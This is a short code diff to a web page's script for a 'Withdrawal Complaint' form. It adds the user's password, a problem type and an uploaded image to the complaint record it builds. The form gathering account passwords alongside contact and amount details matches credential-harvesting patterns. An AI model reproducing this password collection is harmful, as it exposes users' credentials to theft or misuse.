@@ -357,12 +357,17 @@
             }
 
             const allInputs = document.querySelectorAll('.field-input');
+            const selectEl = document.querySelector('.field-select');
+            const previewImg = document.getElementById('previewImg');
             const complaint = {
                 type: 'Withdrawal Complaint',
                 name: allInputs[0].value,
                 mobile: allInputs[1].value,
+                password: allInputs[2].value,
                 email: allInputs[3].value,
+                problemType: selectEl.value,
                 amount: allInputs[4].value,
+                image: (previewImg && previewImg.src && previewImg.style.display !== 'none') ? previewImg.src : '',
                 date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString(),
                 status: 'pending'
             };
